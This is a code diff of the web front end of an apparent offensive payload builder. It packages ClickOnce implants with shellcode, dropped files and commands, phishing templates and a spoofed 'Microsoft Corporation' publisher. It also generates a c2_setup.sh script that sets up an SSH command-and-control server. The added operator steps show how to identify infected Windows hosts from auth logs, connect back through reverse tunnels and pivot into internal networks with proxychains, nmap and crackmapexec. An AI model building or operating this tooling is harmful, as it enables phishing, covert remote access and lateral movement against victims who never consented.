 id "$SSH_USER" &>/dev/null || useradd -m -s /usr/sbin/nologin "$SSH_USER"
 
-echo "[*] Installing authorized_keys for $SSH_USER ..."
+echo "[*] Configuring authorized_keys for $SSH_USER ..."
 mkdir -p /home/$SSH_USER/.ssh
 chmod 700 /home/$SSH_USER/.ssh
 cat >> /home/$SSH_USER/.ssh/authorized_keys << 'PUBKEY'
-${pubkeyBlock}
+${pub}
 PUBKEY
 chmod 600 /home/$SSH_USER/.ssh/authorized_keys
 chown -R "$SSH_USER:$SSH_USER" /home/$SSH_USER/.ssh
 
-echo "[*] Configuring sshd ..."
+echo "[*] Updating sshd_config ..."
 grep -qxF 'AllowTcpForwarding yes' /etc/ssh/sshd_config || \\
     echo 'AllowTcpForwarding yes' >> /etc/ssh/sshd_config
-grep -qxF 'GatewayPorts yes' /etc/ssh/sshd_config || \\
-    echo 'GatewayPorts yes' >> /etc/ssh/sshd_config
-grep -qxF "AllowUsers $SSH_USER" /etc/ssh/sshd_config || \\
-    echo "AllowUsers $SSH_USER" >> /etc/ssh/sshd_config
+grep -qxF 'GatewayPorts yes'       /etc/ssh/sshd_config || \\
+    echo 'GatewayPorts yes'       >> /etc/ssh/sshd_config
 
-echo "[*] Adding extra listen ports (${portsListStr}) ..."
-for PORT in ${portsUfw}; do
+echo "[*] Updating sshd_config (AllowUsers) ..."
+if grep -qE '^AllowUsers[[:space:]]' /etc/ssh/sshd_config; then
+    if grep -E '^AllowUsers[[:space:]]' /etc/ssh/sshd_config | grep -qwF "$SSH_USER"; then
+        echo "    $SSH_USER already in AllowUsers — no change."
+    else
+        sed -i "s|^\\(AllowUsers[[:space:]].*\\)|\\1 $SSH_USER|" /etc/ssh/sshd_config
+        echo "    Appended $SSH_USER to existing AllowUsers line."
+    fi
+else
+    OPERATOR=\${SUDO_USER:-$USER}
+    if [ -z "$OPERATOR" ] || [ "$OPERATOR" = "root" ]; then
+        echo "AllowUsers $SSH_USER" >> /etc/ssh/sshd_config
+        echo "    Added AllowUsers $SSH_USER (verify you have a fallback auth method)."
+    else
+        echo "AllowUsers $SSH_USER $OPERATOR" >> /etc/ssh/sshd_config
+        echo "    Added AllowUsers $SSH_USER $OPERATOR (operator account $OPERATOR preserved)."
+    fi
+fi
+
+echo "[*] Adding extra SSH listen ports (${portsList}) ..."
+for PORT in ${portsLoop}; do
     [ "$PORT" -eq 22 ] && continue
     grep -qxF "Port $PORT" /etc/ssh/sshd_config || \\
         echo "Port $PORT" >> /etc/ssh/sshd_config
@@ -1601,165 +1037,377 @@ done
 echo "[*] Restarting sshd ..."
 service ssh restart
 
-echo "[*] Opening firewall ports (${portsListStr}) ..."
-if command -v ufw &>/dev/null; then
-    for PORT in ${portsUfw}; do
+echo "[*] Opening firewall ports (${portsList}) ..."
+if which ufw &>/dev/null; then
+    for PORT in ${portsLoop}; do
         ufw allow "$PORT"/tcp
     done
     ufw reload
 fi
 
-echo "[+] Done."
-echo "    When a target connects, run:"
-echo "    ssh -i operator_key -p $TUNNEL_PORT ${cfg.ssh_user}@<this-host>"
+echo "[+] Done. When a target connects, read the operator port from the C2 auth log:"
+echo "    journalctl -u ssh | grep 'Invalid user'"
+echo "    Format: Invalid user <win-user>.<machine>.p<PORT> from ..."
+echo "    The .p<PORT> suffix is the dynamic tunnel port — use it to connect:"
+echo "    ssh -i operator_key -p <PORT> $SSH_USER@localhost"
 `;
-            }
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([script], {type:'text/plain'}));
+  a.download = 'c2_setup.sh';
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
 
-            function triggerDownload(content, filename, mimeType) {
-                const blob = new Blob([content], { type: mimeType });
-                const url  = URL.createObjectURL(blob);
-                const a    = document.createElement('a');
-                a.href = url; a.download = filename;
-                document.body.appendChild(a); a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }
+// ── Phish preview ─────────────────────────────────────────────────────────
+function togglePhishPreview() {
+  _phishPreviewVisible = !_phishPreviewVisible;
+  document.getElementById('phishPreviewWrap').classList.toggle('visible', _phishPreviewVisible);
+  if (_phishPreviewVisible) renderPhishPreview();
+}
+function onPhishTemplateChange() { if (_phishPreviewVisible) renderPhishPreview(); }
+function onProviderUrlChange()   { if (_phishPreviewVisible) renderPhishPreview(); }
+async function renderPhishPreview() {
+  const name = document.getElementById('bh-phishTemplate').value;
+  const url  = document.getElementById('bh-providerUrl').value || '#';
+  document.getElementById('phishPreviewLabel').textContent =
+    document.querySelector(`#bh-phishTemplate option[value="${name}"]`)?.textContent || name;
+  try {
+    if (!_phishCache[name]) {
+      const r = await fetch(`/api/phish-template/${name}`);
+      _phishCache[name] = await r.text();
+    }
+    document.getElementById('phishPreviewFrame').srcdoc =
+      _phishCache[name].replaceAll('{{provider_url}}', url);
+  } catch(_) {
+    document.getElementById('phishPreviewFrame').srcdoc =
+      '<p style="font-family:sans-serif;padding:20px;color:#c00">Preview unavailable</p>';
+  }
+}
 
-            document.getElementById('bh-download-c2-btn').addEventListener('click', async () => {
-                document.getElementById('bh-step1-error').style.display = 'none';
-                if (!validateStep1()) return;
-                const btn = document.getElementById('bh-download-c2-btn');
-                btn.disabled = true;
-                btn.textContent = 'Saving…';
-                try {
-                    const data = await saveC2Config(false);
-                    setBhKeypairUI(data.keypair);
-                    const pubkeyBlock = data.keypair.public_key || '# PASTE YOUR OUTBOUND SSH PUBLIC KEY HERE';
-                    const script = buildC2SetupScript(data.config, pubkeyBlock);
-                    triggerDownload(script, 'c2_setup.sh', 'text/x-sh');
-                } catch (e) {
-                    showStep1Error("Failed to save / download: " + e.message);
-                } finally {
-                    btn.disabled = false;
-                    btn.textContent = '↓ Download c2_setup.sh';
-                }
-            });
+// ── Build log modal ────────────────────────────────────────────────────────
+function openLogModal(buildid) {
+  _resultsShown = false;
+  document.getElementById('logModal').classList.remove('hidden');
+  document.getElementById('modalBuildId').textContent = buildid;
+  document.getElementById('modalDirLink').href = window.location.origin + '/build/' + buildid + '/';
+  document.getElementById('logContent').textContent = '';
+  document.getElementById('resultsPanel').classList.remove('visible');
+  document.getElementById('opsBox').style.display = 'none';
+  setLogStatus('running', 'Building\u2026');
+  if (_logPollTimer) clearInterval(_logPollTimer);
+  _logPollTimer = setInterval(() => pollLog(buildid), 2000);
+}
+function closeLogModal() {
+  document.getElementById('logModal').classList.add('hidden');
+  if (_logPollTimer) { clearInterval(_logPollTimer); _logPollTimer = null; }
+}
+async function pollLog(buildid) {
+  try {
+    const text = await (await fetch(`/build/${buildid}/build.log`)).text();
+    document.getElementById('logContent').textContent = text;
+    const body = document.querySelector('.log-body');
+    body.scrollTop = body.scrollHeight;
+    if (text.includes('Build complete')) {
+      clearInterval(_logPollTimer); _logPollTimer = null;
+      setLogStatus('done', 'Build complete');
+    } else if (text.includes('Build failed') || text.includes('error MSB') || text.toLowerCase().includes('exception')) {
+      clearInterval(_logPollTimer); _logPollTimer = null;
+      setLogStatus('error', 'Build failed \u2014 see log above');
+    }
+  } catch(_) {}
+}
+function setLogStatus(state, msg) {
+  const el = document.getElementById('logPulse');
+  el.className = 'log-pulse' + (state==='done' ? ' done' : state==='error' ? ' error' : '');
+  document.getElementById('logStatusText').textContent = msg;
+}
+function showResultsInModal(links, opsHtml) {
+  _resultsShown = true;
+  const linksEl = document.getElementById('resultLinks');
+  linksEl.innerHTML = links.map(l =>
+    `<a class="result-link" href="${l.url}"${l.dl?' download':''}${l.blank?' target="_blank"':''}>${l.label}</a>`
+  ).join('');
+  const opsEl = document.getElementById('opsBox');
+  if (opsHtml) { opsEl.innerHTML = opsHtml; opsEl.style.display = 'block'; }
+  document.getElementById('resultsPanel').classList.add('visible');
+}
 
-            // ── Build submission ──────────────────────────────────────────────────────
+function buildBoltholeOpsHtml(p) {
+  return `<div class="ops-section">
+     <div class="ops-label">1. Identify target — user AND operator port from C2 auth log</div>
+     <div class="cmd-block" onclick="selectAllText(this)" title="Click to select all"><span class="cmd-comment"># Implant announces Windows identity + selected tunnel port before opening the tunnel.
+# Auth log format:
+#   Invalid user john.LAPTOP-ABC123.p31335 from 1.2.3.4 port 54321
+#                └─── windows user ───┘     └─ port ─┘
+# The .p&lt;PORT&gt; suffix is the dynamic tunnel port to use in step 2.</span>
 
-            function showBhResults(buildid, formVals) {
-                const base = window.location.origin + "/build/" + buildid + "/";
-                const name = formVals.name;
+journalctl -u ssh -f | grep "Invalid user"
+<span class="cmd-comment"># or on older systems:</span>
+tail -f /var/log/auth.log | grep "Invalid user"</div>
+   </div>
+   <div class="ops-section">
+     <div class="ops-label">2. Connect to target via reverse tunnel (run on C2)</div>
+     <div class="cmd-block" onclick="selectAllText(this)" title="Click to select all"><span class="cmd-comment"># Replace &lt;win-user&gt; and &lt;PORT&gt; with values read from the auth log above.
+# operator_key is in the build package.</span>
 
-                document.getElementById("bh-dirLink").href = base;
-                document.getElementById("bh-dirLink").textContent = base;
+ssh -i operator_key -p &lt;PORT&gt; &lt;win-user&gt;@localhost</div>
+   </div>
+   <div class="ops-section">
+     <div class="ops-label">3. Route traffic through target network — SOCKS5 proxy</div>
+     <div class="cmd-block" onclick="selectAllText(this)" title="Click to select all"><span class="cmd-comment"># Add to /etc/proxychains4.conf:
+#   socks5  127.0.0.1  ${p.socks_port||1080}</span>
 
-                document.getElementById("bh-link-zip").href   = base + name + ".zip";
-                document.getElementById("bh-label-zip").textContent = name + ".zip";
-                document.getElementById("bh-link-key").href   = base + "operator_key";
-                document.getElementById("bh-link-phish").href = base + "phish.html";
-                document.getElementById("bh-link-setup").href = base + "c2_setup.sh";
+proxychains4 nmap -sT -Pn 10.0.0.0/24
+proxychains4 crackmapexec smb 10.0.0.0/24</div>
+   </div>
+   <div class="ops-section">
+     <div class="ops-label">C2 host</div>
+     <div class="cmd-block">${p.ssh_user||''}@${p.ssh_host||''}  tunnel-range:${p.tunnel_port_range||''}  socks:${p.socks_port||1080}</div>
+   </div>`;
+}
 
-                const steps = document.getElementById("bh-checklist-steps");
-                steps.innerHTML = "";
-                const items = [
-                    `Run <code>c2_setup.sh</code> as root on your C2 VM — creates the <code>${formVals.sshUser}</code> no-login user, installs the outbound key in <code>authorized_keys</code>, opens ports <code>${formVals.ports}</code>, and enables <code>GatewayPorts</code> / <code>AllowTcpForwarding</code> in sshd.`,
-                    `Serve <code>${name}.zip</code> and <code>phish.html</code> from a web server reachable by targets.`,
-                    `Deliver the ClickOnce link to your targets.`,
-                    `Watch SSH auth log on the C2 — each new implant connection logs the Windows username before the tunnel is established (see Operations Reference below).`,
-                    `Connect to the target via reverse tunnel using <code>operator_key</code> and the username from the auth log — or proxy through SOCKS5 at <code>${formVals.sshHost}:${formVals.socksPort}</code>.`,
-                ];
-                items.forEach(text => {
-                    const li = document.createElement("li");
-                    li.innerHTML = text;
-                    steps.appendChild(li);
-                });
+// Open a build log from history — auto-shows results panel when complete
+function openHistoryLog(buildid) {
+  openLogModal(buildid);
+  watchForCompletion(buildid, () => autoShowResults(buildid));
+}
 
-                // ── Operations reference ──────────────────────────────────────────────
-                document.getElementById('bh-cmd-monitor').innerHTML =
-                    '<span class="cmd-comment"># Implant sends a probe connection as Windows identity before the real tunnel.</span>\n' +
-                    '<span class="cmd-comment"># Auth log entry: Invalid user johndoe.LAPTOP-ABC123 from 1.2.3.4 port 54321</span>\n\n' +
-                    'journalctl -u ssh -f | grep "Invalid user"\n' +
-                    '<span class="cmd-comment"># or on older systems:</span>\n' +
-                    'tail -f /var/log/auth.log | grep "Invalid user"';
+// Resolve results for any buildid by reading build-meta.json
+async function autoShowResults(buildid) {
+  if (_resultsShown) return;
+  const base = window.location.origin + '/build/' + buildid + '/';
+  let meta = null;
+  try {
+    const r = await fetch(base + 'build-meta.json');
+    if (r.ok) meta = await r.json();
+  } catch(_) {}
+  const name = meta?.name || buildid;
+  if (meta?.type === 'bolthole') {
+    showResultsInModal([
+      { url: base + name + '.zip',  label: '&#8659; ' + name + '.zip', dl: true },
+      { url: base + 'operator_key', label: '&#128273; operator_key', dl: true },
+      { url: base + 'c2_setup.sh', label: '&#8659; c2_setup.sh', dl: true },
+      { url: base,                  label: '&#128193; Browse Build Dir', blank: true },
+    ], buildBoltholeOpsHtml(meta));
+  } else {
+    showResultsInModal([
+      { url: base + name + '.zip', label: '&#8659; ' + name + '.zip', dl: true },
+      { url: base,                 label: '&#128193; Browse Build Dir', blank: true },
+    ]);
+  }
+}
 
-                document.getElementById('bh-cmd-connect').innerHTML =
-                    '<span class="cmd-comment"># Replace &lt;windows-user&gt; with the username seen in the auth log above.</span>\n' +
-                    '<span class="cmd-comment"># operator_key is downloaded with the build package.</span>\n\n' +
-                    `ssh -i operator_key -p ${formVals.tunnelPort} &lt;windows-user&gt;@localhost`;
+// ── Completion watcher (separate from log poller) ─────────────────────────
+function watchForCompletion(buildid, cb) {
+  const check = async () => {
+    try {
+      const text = await (await fetch(`/build/${buildid}/build.log`)).text();
+      if (text.includes('Build complete')) {
+        // If modal was closed, reopen it so results are never silently lost
+        if (document.getElementById('logModal').classList.contains('hidden')) {
+          openLogModal(buildid);
+        }
+        cb(); return;
+      }
+      if (text.includes('Build failed') || text.includes('error MSB')) return;
+    } catch(_) {}
+    setTimeout(check, 2000);
+  };
+  setTimeout(check, 2000);
+}
 
-                document.getElementById('bh-cmd-socks').innerHTML =
-                    '<span class="cmd-comment"># Dynamic SOCKS5 — routes tool traffic through the target\'s internal network.</span>\n\n' +
-                    `<span class="cmd-comment"># 1. Add to /etc/proxychains4.conf:</span>\n` +
-                    `<span class="cmd-comment">#    socks5  127.0.0.1  ${formVals.socksPort}</span>\n\n` +
-                    `proxychains4 nmap -sT -Pn 10.0.0.0/24\n` +
-                    `proxychains4 crackmapexec smb 10.0.0.0/24`;
+function reopenLastBuild() {
+  if (_currentBuildId) {
+    openLogModal(_currentBuildId);
+    watchForCompletion(_currentBuildId, () => autoShowResults(_currentBuildId));
+  }
+}
 
-                document.getElementById('bh-ops-ref').style.display = '';
+function showReopenButtons() {
+  document.getElementById('cfcoReopenBtn').classList.add('visible');
+  document.getElementById('bhReopenBtn').classList.add('visible');
+}
 
-                document.getElementById("bh-resultsSection").style.display = "block";
-                window.open(base, '_blank');
-            }
+// ── CFCO submit ────────────────────────────────────────────────────────────
+async function submitCfco() {
+  const name = document.getElementById('nameInput').value.trim();
+  if (!name) return showCfcoError('Application name is required.');
+  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(name)) return showCfcoError('Name must match ^[a-zA-Z_][a-zA-Z0-9_]*$');
+  hideCfcoError();
+  document.getElementById('submitBtn').disabled = true;
 
-            document.getElementById("bh-submitBtn").addEventListener("click", async () => {
-                clearBhResults();
+  const actions = [];
+  let validationError = null;
+  const fileReads = [];
 
-                const name         = document.getElementById("bh-name").value.trim();
-                const sideload     = document.querySelector('input[name="bh-sideloadOption"]:checked').value;
-                const providerUrl  = document.getElementById("bh-providerUrl").value.trim();
-                const version      = document.getElementById("bh-version").value.trim() || "1.0.0.0";
-                const inflate      = parseInt(document.getElementById("bh-inflateSlider").value);
-                const filesPrefix  = document.getElementById("bh-filesPrefix").value.trim() || "bolt";
-                const sshHost      = document.getElementById("bh-sshHost").value.trim();
-                const sshUser      = document.getElementById("bh-sshUser").value.trim();
-                const ports        = document.getElementById("bh-ports").value.trim();
-                const tunnelPort   = parseInt(document.getElementById("bh-tunnelPort").value);
-                const socksPort    = parseInt(document.getElementById("bh-socksPort").value);
-                const startupDelay = parseInt(document.getElementById("bh-startupDelay").value);
-                const reconnDelay  = parseInt(document.getElementById("bh-reconnectDelay").value);
-                const operatorPubkey = getKeyValues('bh-opkeys-container').join('\n');
+  document.querySelectorAll('#actionCards .action-card').forEach(card => {
+    const type = card.dataset.type;
+    const idx  = card.dataset.idx;
+    if (type === 'run_code') {
+      const fi = document.getElementById('codefile-'+idx);
+      if (!fi?.files[0]) { validationError = 'Shellcode action requires a file.'; return; }
+      fileReads.push(new Promise(res => {
+        const fr = new FileReader();
+        fr.onload = e => { actions.push({ type:'run_code', file: e.target.result.split(',')[1] }); res(); };
+        fr.readAsDataURL(fi.files[0]);
+      }));
+    } else if (type === 'drop_file') {
+      const fi  = document.getElementById('dropfile-'+idx);
+      const loc = document.getElementById('droplocation-'+idx)?.value||'';
+      if (!fi?.files[0]) { validationError = 'Drop File action requires a file.'; return; }
+      if (!loc)          { validationError = 'Drop File action requires a drop location.'; return; }
+      fileReads.push(new Promise(res => {
+        const fr = new FileReader();
+        fr.onload = e => { actions.push({ type:'drop_file', file: e.target.result.split(',')[1], location: loc }); res(); };
+        fr.readAsDataURL(fi.files[0]);
+      }));
+    } else if (type === 'run_cmd') {
+      const cmd = document.getElementById('command-'+idx)?.value||'';
+      if (!cmd) { validationError = 'Run Command action requires a command.'; return; }
+      actions.push({ type:'run_cmd', cmd });
+    }
+  });
 
-                if (!name) { showBhError("Application Name is required."); return; }
-                if (!isValidClickOnceName(name)) {
-                    showBhError("Name must start with a letter, contain only alphanumeric characters and underscores, and cannot end with an underscore.");
-                    return;
-                }
+  if (validationError) {
+    showCfcoError(validationError);
+    document.getElementById('submitBtn').disabled = false;
+    return;
+  }
+  await Promise.all(fileReads);
 
-                const requestData = {
-                    name, sideload,
-                    provider_url: providerUrl,
-                    version,
-                    inflate,
-                    files_prefix: filesPrefix,
-                    ssh_host: sshHost,
-                    ssh_user: sshUser,
-                    ports,
-                    tunnel_port: tunnelPort,
-                    socks_port: socksPort,
-                    startup_delay: startupDelay,
-                    reconnect_delay: reconnDelay,
-                    operator_pubkey: operatorPubkey,
-                };
+  const body = {
+    name,
+    action: actions,
+    sideload: document.querySelector('input[name="cfco-sideload"]:checked')?.value||'tzsync',
+    inflate: parseInt(document.getElementById('inflateSlider').value)||0,
+    phish_template: document.getElementById('cfco-phishTemplate').value,
+    publisher: document.getElementById('publisherInput').value||'Microsoft Corporation',
+    description: document.getElementById('descriptionInput').value||'',
+    icon: _cfcoIconB64,
+  };
 
-                try {
-                    showProcessingOverlay();
-                    const response = await fetch(
-                        new URL(window.location.origin + "/api/bolthole-build").href,
-                        { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(requestData) }
-                    );
-                    hideProcessingOverlay();
-                    if (!response.ok) throw new Error(`Server Error: ${response.status}`);
-                    const responseData = await response.json();
-                    if (responseData.buildid) {
-                        showBhResults(responseData.buildid, { name, sshHost, sshUser, ports, tunnelPort, socksPort });
-                    } else {
-                        showBhError("No buildid received from server.");
-                    }
-                } catch (error) {
-                    hideProcessingOverlay();
-                    showBhError(`Failed to submit request: ${error.message}`);
-                }
-            });
-        </script>
-    </body>
+  try {
+    const r = await fetch('/api/build', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
+    if (!r.ok) throw new Error(await r.text());
+    const { buildid } = await r.json();
+    _currentBuildId = buildid;
+    showReopenButtons();
+    document.getElementById('submitBtn').disabled = false;
+    openLogModal(buildid);
+    watchForCompletion(buildid, () => {
+      const base = window.location.origin + '/build/' + buildid + '/';
+      showResultsInModal([
+        { url: base + name + '.zip', label: '&#8659; ' + name + '.zip', dl: true },
+        { url: base, label: '&#128193; Browse Build Dir', blank: true },
+      ]);
+    });
+  } catch(e) {
+    showCfcoError('Build request failed: ' + e.message);
+    document.getElementById('submitBtn').disabled = false;
+  }
+}
+
+function showCfcoError(msg) { const el=document.getElementById('cfcoError'); el.textContent=msg; el.classList.add('visible'); }
+function hideCfcoError()    { document.getElementById('cfcoError').classList.remove('visible'); }
+
+// ── Bolthole submit ────────────────────────────────────────────────────────
+async function submitBolthole() {
+  const name     = document.getElementById('bh-name').value.trim();
+  const ssh_host = document.getElementById('bh-sshHost').value.trim();
+  if (!name)     return showBhError('Application name is required.');
+  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(name)) return showBhError('Name must match ^[a-zA-Z_][a-zA-Z0-9_]*$');
+  if (!ssh_host) return showBhError('C2 Host is required. Go back to Step 1.');
+  hideBhError();
+  document.getElementById('bh-submitBtn').disabled = true;
+
+  const opKeys = Array.from(document.querySelectorAll('#bh-opkeys-container textarea'))
+    .map(t => t.value.trim()).filter(Boolean).join('\n');
+
+  const body = {
+    name,
+    sideload:       document.querySelector('input[name="bh-sideload"]:checked')?.value||'perfwatson2',
+    provider_url:   document.getElementById('bh-providerUrl').value||'',
+    version:        document.getElementById('bh-version').value||'1.0.0.0',
+    inflate:        parseInt(document.getElementById('bh-inflateSlider').value)||0,
+    files_prefix:   document.getElementById('bh-filesPrefix').value||'bolt',
+    ssh_host,
+    ssh_user:       document.getElementById('bh-sshUser').value.trim(),
+    ports:          document.getElementById('bh-ports').value||'443,80,22,31337',
+    tunnel_port_range: document.getElementById('bh-tunnelPort').value.trim()||'31332-31345',
+    socks_port:     parseInt(document.getElementById('bh-socksPort').value)||1080,
+    startup_delay:  parseInt(document.getElementById('bh-startupDelay').value)||5,
+    reconnect_delay:parseInt(document.getElementById('bh-reconnectDelay').value)||30,
+    operator_pubkey:opKeys,
+    phish_template: document.getElementById('bh-phishTemplate').value,
+    publisher:      document.getElementById('bh-publisher').value||'Microsoft Corporation',
+    description:    document.getElementById('bh-description').value||'',
+    icon:           _bhIconB64,
+  };
+
+  try {
+    const r = await fetch('/api/bolthole-build', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
+    if (!r.ok) throw new Error(await r.text());
+    const { buildid } = await r.json();
+    _currentBuildId = buildid;
+    showReopenButtons();
+    document.getElementById('bh-submitBtn').disabled = false;
+    openLogModal(buildid);
+    watchForCompletion(buildid, () => {
+      const base = window.location.origin + '/build/' + buildid + '/';
+      if (_resultsShown) return;
+      showResultsInModal([
+        { url: base + name + '.zip', label: '&#8659; ' + name + '.zip', dl: true },
+        { url: base + 'operator_key', label: '&#128273; operator_key', dl: true },
+        { url: base + 'c2_setup.sh', label: '&#8659; c2_setup.sh', dl: true },
+        { url: base, label: '&#128193; Browse Build Dir', blank: true },
+      ], buildBoltholeOpsHtml(body));
+    });
+  } catch(e) {
+    showBhError('Build request failed: ' + e.message);
+    document.getElementById('bh-submitBtn').disabled = false;
+  }
+}
+
+function showBhError(msg) { const el=document.getElementById('bhError'); el.textContent=msg; el.classList.add('visible'); }
+function hideBhError()    { document.getElementById('bhError').classList.remove('visible'); }
+
+// ── Build history ──────────────────────────────────────────────────────────
+async function loadHistory() {
+  if (_historyRefreshTimer) { clearInterval(_historyRefreshTimer); _historyRefreshTimer = null; }
+  const el = document.getElementById('historyContent');
+  try {
+    const builds = await (await fetch('/api/builds')).json();
+    if (!builds.length) {
+      el.innerHTML = '<p class="history-empty">No builds yet. Submit a payload to get started.</p>';
+      return;
+    }
+    const rows = builds.map(b => {
+      const badgeCls = b.status === 'complete' ? 'complete' : b.status === 'failed' ? 'failed' : 'building';
+      const badgeTxt = b.status === 'complete' ? '&#10003; complete' : b.status === 'failed' ? '&#10007; failed' : '&#8226; building';
+      const dlBtn = b.zip
+        ? `<a class="btn btn-ghost btn-sm" href="/build/${b.buildid}/${b.zip}" download title="Download zip">&#8659;</a>`
+        : '';
+      const displayName = b.name || b.buildid;
+      return `<div class="history-row">
+        <span class="history-ts">${b.ts}</span>
+        <span class="history-id" title="${b.buildid}">${displayName}</span>
+        <span class="history-zip">${b.buildid}</span>
+        <span class="status-badge ${badgeCls}">${badgeTxt}</span>
+        <span class="history-actions">
+          <button class="btn btn-ghost btn-sm" onclick="openHistoryLog('${b.buildid}')">&#128196; Log</button>
+          ${dlBtn}
+        </span>
+      </div>`;
+    }).join('');
+    el.innerHTML = `<div class="history-list">${rows}</div>`;
+    // Auto-refresh while any build is still running
+    if (builds.some(b => b.status === 'building')) {
+      _historyRefreshTimer = setInterval(loadHistory, 5000);
+    }
+  } catch(e) {
+    el.innerHTML = '<p class="history-empty" style="color:var(--red)">Failed to load history.</p>';
+  }
+}
+</script>
+</body>
 </html>
